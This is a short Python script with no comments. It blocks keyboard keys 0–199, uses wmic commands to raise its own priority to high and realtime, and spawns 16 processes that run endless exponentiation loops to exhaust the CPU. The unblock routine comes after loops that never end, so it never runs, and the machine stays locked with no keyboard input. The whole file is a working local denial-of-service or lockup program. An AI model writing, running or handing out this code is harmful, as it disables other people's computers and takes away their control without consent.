import multiprocessing
import os  
import time
import threading
import keyboard

for i in range(200):
    keyboard.block_key(i)

def setpriority(): 
    os.system("wmic process where processid=\""+str(os.getpid())+"\" CALL   setpriority \"high\"")

def setpriority2(): 
    os.system("wmic process where processid=\""+str(os.getpid())+"\" CALL   setpriority \"realtime\"")

numbers = {10000, 20000, 30000, 40000, 50000, 60000, 70000, 80000, 90000, 100000, 110000, 120000, 130000, 140000, 150000, 160000}
executing = False

def use_dat_cpu(a):
    global executing
    while executing == True:
        b=4
        x=0
        setpriority()
        while True:
            b=b**a
            x+=1

def stop_block():
    global executing
    setpriority2()
    time.sleep(2)
    for i in range(200):
        keyboard.unblock_key(i)
    executing = False


def start():
    global executing
    executing = True
    pool = multiprocessing.Pool(16)
    pool.map(use_dat_cpu, numbers)
    pool.close()
    threading.Thread(target = stop_block).start()

if __name__ == "__main__":
    start()
